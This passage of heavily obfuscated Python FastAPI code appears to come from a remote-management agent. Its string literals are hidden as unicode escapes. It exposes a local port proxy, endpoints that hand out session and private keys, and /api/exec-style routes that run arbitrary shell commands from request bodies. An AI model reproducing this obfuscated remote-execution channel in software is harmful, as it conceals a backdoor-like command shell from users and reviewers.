        return JSONResponse(status_code=422, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073\\u0020\\u5fc5\\u987b\\u4e3a\\u7aef\\u53e3\\u6570\\u7ec4\\u002c\\u0020\\u5982\\u0020\\u007b\\u0022\\u0070\\u006f\\u0072\\u0074\\u0073\\u0022\\u003a\\u005b\\u0037\\u0037\\u0038\\u0038\\u002c\\u0039\\u0030\\u0039\\u0030\\u005d\\u007d', 'unicode_escape')})
    O0_var_1861 = payload.get(codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'))
    O0_var_1862 = payload.get(codecs.decode('\\u0073\\u0063\\u006f\\u0070\\u0065', 'unicode_escape'), PROXY_GROUP_LOCAL)
    if O0_var_1862 not in (PROXY_GROUP_HUB, PROXY_GROUP_LOCAL):
        return JSONResponse(status_code=422, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0073\\u0063\\u006f\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0073\\u0063\\u006f\\u0070\\u0065\\u0020\\u5fc5\\u987b\\u4e3a\\u0020\\u0022\\u006c\\u006f\\u0063\\u0061\\u006c\\u0022\\u0020\\u6216\\u0020\\u0022\\u0068\\u0075\\u0062\\u0022', 'unicode_escape')})
    if not isinstance(O0_var_1861, list):
        return JSONResponse(status_code=422, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u0073\\u0020\\u5fc5\\u987b\\u4e3a\\u7aef\\u53e3\\u6570\\u7ec4\\u002c\\u0020\\u5982\\u0020\\u007b\\u0022\\u0070\\u006f\\u0072\\u0074\\u0073\\u0022\\u003a\\u005b\\u0037\\u0037\\u0038\\u0038\\u002c\\u0039\\u0030\\u0039\\u0030\\u005d\\u007d', 'unicode_escape')})
    O0_fn_66(O0_var_1862, O0_var_1861)
    O0_var_1863 = _persist_proxyports(request.app.state)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1863, codecs.decode('\\u0073\\u0063\\u006f\\u0070\\u0065', 'unicode_escape'): O0_var_1862, codecs.decode('\\u0072\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_68(O0_var_1862), codecs.decode('\\u0065\\u0066\\u0066\\u0065\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_65(O0_var_1862)}

@app.delete(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u0063\\u006f\\u006e\\u0066\\u0069\\u0067', 'unicode_escape'))
async def O0_fn_71(request: Request, scope: str=codecs.decode('', 'unicode_escape')):
    if scope and scope not in (PROXY_GROUP_HUB, PROXY_GROUP_LOCAL):
        return JSONResponse(status_code=422, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0073\\u0063\\u006f\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u0073\\u0063\\u006f\\u0070\\u0065\\u0020\\u5fc5\\u987b\\u4e3a\\u0020\\u0022\\u006c\\u006f\\u0063\\u0061\\u006c\\u0022\\u0020\\u6216\\u0020\\u0022\\u0068\\u0075\\u0062\\u0022', 'unicode_escape')})
    O0_var_1864 = [scope] if scope else [PROXY_GROUP_HUB, PROXY_GROUP_LOCAL]
    for O0_var_1865 in O0_var_1864:
        O0_fn_66(O0_var_1865, [])
    O0_var_1866 = _persist_proxyports(request.app.state)
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0065\\u0072\\u0073\\u0069\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_1866, codecs.decode('\\u0073\\u0063\\u006f\\u0070\\u0065', 'unicode_escape'): scope or codecs.decode('\\u0061\\u006c\\u006c', 'unicode_escape'), codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'): {codecs.decode('\\u0072\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_68(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape')), codecs.decode('\\u0065\\u0066\\u0066\\u0065\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_65(codecs.decode('\\u0068\\u0075\\u0062', 'unicode_escape'))}, codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'): {codecs.decode('\\u0072\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_68(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')), codecs.decode('\\u0065\\u0066\\u0066\\u0065\\u0063\\u0074\\u0069\\u0076\\u0065\\u005f\\u0070\\u006f\\u0072\\u0074\\u0073', 'unicode_escape'): O0_fn_65(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape'))}}

@app.api_route(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d', 'unicode_escape'), methods=_PROXY_METHODS)
@app.api_route(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d\\u002f\\u007b\\u0072\\u0065\\u0073\\u0074\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'), methods=_PROXY_METHODS)
async def O0_fn_72(request: Request, port: str, rest: str=codecs.decode('', 'unicode_escape')):
    try:
        O0_var_1867 = int(port)
        if not 1 <= O0_var_1867 <= 65535:
            raise ValueError(port)
    except ValueError:
        return JSONResponse(status_code=404, content={codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'), codecs.decode('\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): codecs.decode('\\u7aef\\u53e3\\u5fc5\\u987b\\u4e3a\\u0020\\u0031\\u002d\\u0036\\u0035\\u0035\\u0033\\u0035\\u0020\\u7684\\u6574\\u6570\\u003a\\u0020\\u0025\\u0072', 'unicode_escape') % port})
    O0_var_1868 = await request.body()
    O0_var_1869 = dict(request.headers)
    for O0_var_1870 in _PROXY_STRIPPED_AUTH_HEADERS:
        O0_var_1869.pop(O0_var_1870, None)
    O0_var_1871 = request.client.host if request.client else None
    O0_var_1872 = getattr(request.app.state, codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), None)
    if O0_var_1872 is None or O0_var_1872.closed:
        O0_var_1872 = aiohttp.ClientSession(auto_decompress=False)
        request.app.state.loopback_session = O0_var_1872
    try:
        O0_var_1873, O0_var_1874, O0_var_1875 = await O0_fn_51(O0_var_1872, port=O0_var_1867, whitelist=O0_fn_65(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')), method=request.method, path=codecs.decode('\\u002f', 'unicode_escape') + rest, query=request.scope.get(codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0079\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'), b'').decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')), headers=O0_var_1869, body=O0_var_1868, relay_timeout=max(5.0, float(Config.KISAMA_HUB_RELAY_TIMEOUT)), max_body=max(1, int(Config.KISAMA_HUB_MAX_BODY)), forwarded_for=O0_var_1871)
    except LoopbackRelayError as exc:
        return _proxy_error_response(exc)
    O0_var_1876 = {O0_var_1877: O0_var_1878 for O0_var_1877, O0_var_1878 in O0_var_1874.items() if str(O0_var_1877).lower() not in _HUB_HOP_HEADERS and str(O0_var_1877).lower() != codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')}

    async def _relay_iter():
        try:
            async for O0_var_1879 in O0_var_1875.content.iter_any():
                yield O0_var_1879
        finally:
            O0_var_1875.release()
    return StreamingResponse(_relay_iter(), status_code=O0_var_1873, headers=O0_var_1876)

def _proxy_ws_dial_headers(O0_var_1880):
    O0_var_1881 = {}
    for O0_var_1882, O0_var_1883 in O0_var_1880 or []:
        O0_var_1884 = O0_var_1882.decode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u002d\\u0031', 'unicode_escape')).lower() if isinstance(O0_var_1882, bytes) else str(O0_var_1882).lower()
        if O0_var_1884 in _HUB_HOP_HEADERS or O0_var_1884.startswith(codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d', 'unicode_escape')) or O0_var_1884.startswith(codecs.decode('\\u0078\\u002d\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061\\u002d\\u0068\\u0075\\u0062\\u002d', 'unicode_escape')):
            continue
        if O0_var_1884 in _PROXY_STRIPPED_AUTH_HEADERS:
            continue
        O0_var_1885 = O0_var_1883.decode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u002d\\u0031', 'unicode_escape')) if isinstance(O0_var_1883, bytes) else str(O0_var_1883)
        O0_var_1881[O0_var_1882.decode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u002d\\u0031', 'unicode_escape')) if isinstance(O0_var_1882, bytes) else str(O0_var_1882)] = O0_var_1885
    return O0_var_1881

async def _proxy_ws_pump_client_to_upstream(O0_var_1886, O0_var_1887):
    while True:
        O0_var_1888 = await O0_var_1886.receive()
        if O0_var_1888.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002e\\u0064\\u0069\\u0073\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074', 'unicode_escape'):
            return
        if O0_var_1888.get(codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')) == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002e\\u0072\\u0065\\u0063\\u0065\\u0069\\u0076\\u0065', 'unicode_escape'):
            if O0_var_1888.get(codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')) is not None:
                await O0_var_1887.send_str(O0_var_1888[codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape')])
            else:
                await O0_var_1887.send_bytes(O0_var_1888.get(codecs.decode('\\u0062\\u0079\\u0074\\u0065\\u0073', 'unicode_escape')) or b'')

async def _proxy_ws_pump_upstream_to_client(O0_var_1889, O0_var_1890):
    async for O0_var_1891 in O0_var_1889:
        if O0_var_1891.type == aiohttp.WSMsgType.BINARY:
            await O0_var_1890.send_bytes(O0_var_1891.data)
        elif O0_var_1891.type == aiohttp.WSMsgType.TEXT:
            await O0_var_1890.send_text(O0_var_1891.data)
        elif O0_var_1891.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSING, aiohttp.WSMsgType.CLOSED, aiohttp.WSMsgType.ERROR):
            return

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u0077\\u0073\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d\\u002f\\u007b\\u0072\\u0065\\u0073\\u0074\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u0077\\u0073\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d', 'unicode_escape'))
async def O0_fn_73(websocket: WebSocket, port: str, rest: str=codecs.decode('', 'unicode_escape')):
    try:
        O0_var_1892 = int(port)
        if not 1 <= O0_var_1892 <= 65535:
            raise ValueError(port)
    except ValueError:
        await websocket.accept()
        await websocket.close(code=1008, reason=codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u005f\\u0070\\u006f\\u0072\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % port[:80])
        return
    if O0_var_1892 not in O0_fn_65(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u006c', 'unicode_escape')):
        await websocket.accept()
        await websocket.close(code=1008, reason=codecs.decode('\\u0070\\u006f\\u0072\\u0074\\u005f\\u006e\\u006f\\u0074\\u005f\\u0061\\u006c\\u006c\\u006f\\u0077\\u0065\\u0064\\u003a\\u0020\\u7aef\\u53e3\\u0020\\u0025\\u0064\\u0020\\u672a\\u5728\\u672c\\u5730\\u53cd\\u4ee3\\u767d\\u540d\\u5355', 'unicode_escape') % O0_var_1892)
        return
    O0_var_1893 = websocket.scope.get(codecs.decode('\\u0071\\u0075\\u0065\\u0072\\u0079\\u005f\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'), b'').decode(codecs.decode('\\u0061\\u0073\\u0063\\u0069\\u0069', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
    O0_var_1894 = _proxy_ws_dial_headers(websocket.scope.get(codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')))
    O0_var_1895 = codecs.decode('\\u0077\\u0073\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064\\u002f\\u0025\\u0073', 'unicode_escape') % (O0_var_1892, rest)
    if O0_var_1893:
        O0_var_1895 += codecs.decode('\\u003f', 'unicode_escape') + O0_var_1893
    O0_var_1896 = getattr(websocket.app.state, codecs.decode('\\u006c\\u006f\\u006f\\u0070\\u0062\\u0061\\u0063\\u006b\\u005f\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'), None)
    if O0_var_1896 is None or O0_var_1896.closed:
        O0_var_1896 = aiohttp.ClientSession(auto_decompress=False)
        websocket.app.state.loopback_session = O0_var_1896
    await websocket.accept()
    try:
        async with O0_var_1896.ws_connect(O0_var_1895, headers=O0_var_1894, autoping=True, timeout=None) as O0_var_1897:
            O0_var_1898 = asyncio.create_task(_proxy_ws_pump_client_to_upstream(websocket, O0_var_1897))
            O0_var_1899 = asyncio.create_task(_proxy_ws_pump_upstream_to_client(O0_var_1897, websocket))
            await asyncio.wait({O0_var_1898, O0_var_1899}, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_1900 in (O0_var_1898, O0_var_1899):
                O0_var_1900.cancel()
    except Exception:
        pass
    finally:
        try:
            await websocket.close()
        except Exception:
            pass

@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d\\u002f\\u007b\\u0072\\u0065\\u0073\\u0074\\u003a\\u0070\\u0061\\u0074\\u0068\\u007d', 'unicode_escape'))
@app.websocket(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0070\\u0072\\u006f\\u0078\\u0079\\u002f\\u007b\\u0070\\u006f\\u0072\\u0074\\u007d', 'unicode_escape'))
async def O0_fn_74(websocket: WebSocket, port: str, rest: str=codecs.decode('', 'unicode_escape')):
    await O0_fn_73(websocket, port, rest)

async def O0_fn_75(request: Request) -> ExecRequestJSON:
    O0_var_1901 = await request.body()
    O0_var_1902 = O0_var_1901.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')).strip()
    if not O0_var_1902:
        raise HTTPException(status_code=400, detail=codecs.decode('\\u0045\\u006d\\u0070\\u0074\\u0079\\u0020\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0020\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'))
    try:
        return ExecRequestJSON.model_validate_json(O0_var_1902)
    except Exception:
        return ExecRequestJSON(cmd=O0_var_1902)

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0062\\u0061\\u0073\\u0065\\u0069\\u006e\\u0066\\u006f', 'unicode_escape'), response_model=BaseInfoResponse)
async def O0_fn_76(request: Request):
    O0_var_1903 = await Config.get_baseinfo_p_snapshot()
    O0_var_1904 = await Config.get_baseinfo_local_snapshot(O0_var_1903.get(codecs.decode('\\u0076\\u0069\\u0072\\u0074\\u0075\\u0061\\u006c\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
    O0_var_1905 = await Config.get_baseinfo_net_snapshot()
    O0_var_1906 = SystemInfoCollector.assemble_base_info(O0_var_1903, O0_var_1904, O0_var_1905)
    if getattr(request.state, codecs.decode('\\u0069\\u0073\\u005f\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'), False):
        O0_var_1906[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.SESSION_KEY
        O0_var_1906[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = Config.NOISE_KEY
    else:
        O0_var_1906[codecs.decode('\\u0073\\u0065\\u0073\\u0073\\u0069\\u006f\\u006e\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
        O0_var_1906[codecs.decode('\\u006e\\u006f\\u0069\\u0073\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')] = None
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape'):
        KModeController.on_baseinfo_success()
    return O0_var_1906

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), response_model=StatusResponse)
async def O0_fn_77(request: Request):
    O0_var_1907 = time.time()
    if Config._status_lock is None:
        Config._status_lock = asyncio.Lock()
    async with Config._status_lock:
        if Config._status_cache is None or O0_var_1907 - Config._status_cache_time > Config.STATUS_CACHE_TTL:
            Config._status_cache = await SystemInfoCollector().get_realtime_info()
            Config._status_cache_time = O0_var_1907
            Logger.debug(codecs.decode('\\U0001f504\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u5b9e\\u65f6\\u76d1\\u63a7\\u7f13\\u5b58\\u5df2\\u8fc7\\u671f\\uff0c\\u5df2\\u91cd\\u65b0\\u751f\\u6210\\u5ea6\\u91cf\\u5feb\\u7167\\u3002', 'unicode_escape'))
        else:
            Logger.debug(codecs.decode('\\U0001f4e6\\u0020\\u005b\\u0043\\u0061\\u0063\\u0068\\u0065\\u005d\\u0020\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0020\\u547d\\u4e2d\\u76d1\\u63a7\\u7f13\\u5b58\\u3002', 'unicode_escape'))
        O0_var_1908 = Config._status_cache.copy()
    return O0_var_1908

@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0064\\u006f', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0072\\u0075\\u006e', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0077\\u006f\\u0072\\u006b', 'unicode_escape'), response_model=ExecResponse)
@app.post(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0065\\u0078\\u0065\\u0063', 'unicode_escape'), response_model=ExecResponse)
async def O0_fn_78(payload: ExecRequestJSON=Depends(O0_fn_75)):
    O0_var_1909 = payload.cmd
    O0_var_1910 = payload.cwd
    O0_var_1911 = payload.env
    O0_var_1912 = Config.Rtimeout
    O0_var_1913 = Config.EXEC_SHELL_MODE
    O0_var_1914 = {codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): O0_var_1913, codecs.decode('\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074', 'unicode_escape'): subprocess.PIPE, codecs.decode('\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072', 'unicode_escape'): subprocess.STDOUT, codecs.decode('\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape'): subprocess.DEVNULL, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): O0_var_1912, codecs.decode('\\u0074\\u0065\\u0078\\u0074', 'unicode_escape'): True, codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072\\u0073', 'unicode_escape'): codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u0077\\u0064', 'unicode_escape'): O0_var_1910}
    if O0_var_1911:
        O0_var_1914[codecs.decode('\\u0065\\u006e\\u0076', 'unicode_escape')] = {**os.environ, **O0_var_1911}
    try:
        O0_var_1915 = await asyncio.to_thread(subprocess.run, O0_var_1909, **O0_var_1914)
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): O0_var_1915.stdout, codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_1915.returncode, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_1909}
    except subprocess.TimeoutExpired as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054\\u005d\\u000a', 'unicode_escape') + str(e.output or ''), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): 124, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): True, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_1909}
    except Exception as e:
        return {codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074', 'unicode_escape'): codecs.decode('\\u005b\\u0045\\u0052\\u0052\\u004f\\u0052\\u005d\\u0020', 'unicode_escape') + str(str(e)), codecs.decode('\\u0065\\u0078\\u0069\\u0074\\u0063\\u006f\\u0064\\u0065', 'unicode_escape'): -1, codecs.decode('\\u0074\\u0069\\u006d\\u0065\\u006f\\u0075\\u0074', 'unicode_escape'): False, codecs.decode('\\u0063\\u006d\\u0064', 'unicode_escape'): O0_var_1909}

def _resolve_tempkey_format(O0_var_1916: str) -> str:
    O0_var_1917 = (O0_var_1916 or codecs.decode('', 'unicode_escape')).strip().lower()
    if O0_var_1917 in (codecs.decode('', 'unicode_escape'), codecs.decode('\\u0066\\u0075\\u006c\\u006c', 'unicode_escape')):
        return codecs.decode('\\u0066\\u0075\\u006c\\u006c', 'unicode_escape')
    if O0_var_1917 == codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape'):
        return codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape')
    raise HTTPException(status_code=422, detail=codecs.decode('\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0027\\u0066\\u0075\\u006c\\u006c\\u0027\\u0020\\u006f\\u0072\\u0020\\u0027\\u0073\\u0068\\u006f\\u0072\\u0074\\u0027', 'unicode_escape'))

@app.get(codecs.decode('\\u002f\\u0061\\u0070\\u0069\\u002f\\u0074\\u0065\\u006d\\u0070\\u006b\\u0065\\u0079', 'unicode_escape'), response_model=TempKeyResponse)
async def O0_fn_79(request: Request, ttl: int=Query(Config.TEMPKEY_DEFAULT_TTL_HOURS, ge=1, le=Config.TEMPKEY_MAX_TTL_HOURS), format: str=Query(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u54cd\\u5e94\\u5bc6\\u94a5\\u7f16\\u7801\\u003a\\u0020\\u7f3a\\u7701\\u002f\\u0066\\u0075\\u006c\\u006c\\u003d\\u0050\\u0045\\u004d\\u002b\\u0068\\u0065\\u0078\\u0020\\u5168\\u683c\\u5f0f\\u002c\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u003d\\u77ed\\u683c\\u5f0f\\u0020\\u0028\\u0030\\u002e\\u0035\\u002e\\u0038\\u0029', 'unicode_escape'))):
    O0_var_1918 = _resolve_tempkey_format(format)
    O0_var_1919 = request.app.state.temp_key_manager
    O0_var_1920 = O0_var_1919.get_or_create(ttl)
    if O0_var_1918 == codecs.decode('\\u0073\\u0068\\u006f\\u0072\\u0074', 'unicode_escape'):
        O0_var_1921 = TempKeyEcdsaPair(private_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u0068\\u0065\\u0078', 'unicode_escape')], public_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')])
        O0_var_1922 = TempKeyEciesPair(private_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')], public_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0069\\u0065\\u0073\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u0062\\u0036\\u0034', 'unicode_escape')])
    else:
        O0_var_1921 = TempKeyEcdsaPair(private_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0072\\u0069\\u0076\\u0061\\u0074\\u0065\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip(), public_key=O0_var_1920[codecs.decode('\\u0065\\u0063\\u0064\\u0073\\u0061\\u005f\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u005f\\u006b\\u0065\\u0079', 'unicode_escape')].strip())
